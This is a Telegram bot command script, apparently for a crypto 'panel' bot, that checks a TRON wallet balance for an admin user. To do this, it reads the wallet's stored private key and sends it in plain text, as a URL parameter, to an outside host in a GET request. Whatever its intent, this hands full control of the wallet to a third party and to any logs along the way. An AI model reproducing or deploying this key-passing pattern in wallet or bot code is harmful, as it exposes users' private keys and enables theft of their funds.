/*CMD
  command: /bPanelBal
  help: 
  need_reply: false
  auto_retry_time: 
  folder: Panel

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

if (chat.chat_type != "private") {
  return
}
var adminid = Bot.getProperty("Madmin")
if (user.telegramid == adminid) {
  let pbal = Libs.ResourcesLib.userRes("pbal")
  let bal = pbal.value().toFixed(8)
  //pbal.remove(parseFloat(bal))
  var data = Bot.getProperty("BotPanel")
  var prkey = data.prkey
  HTTP.get({
    url: "https://txt.cwtip.co/tron/get/?pkey=" + prkey + "",
    success: "/onPanBalChk Yes"
  })
} else {
  Bot.sendMessage("❌Access Denied")
}

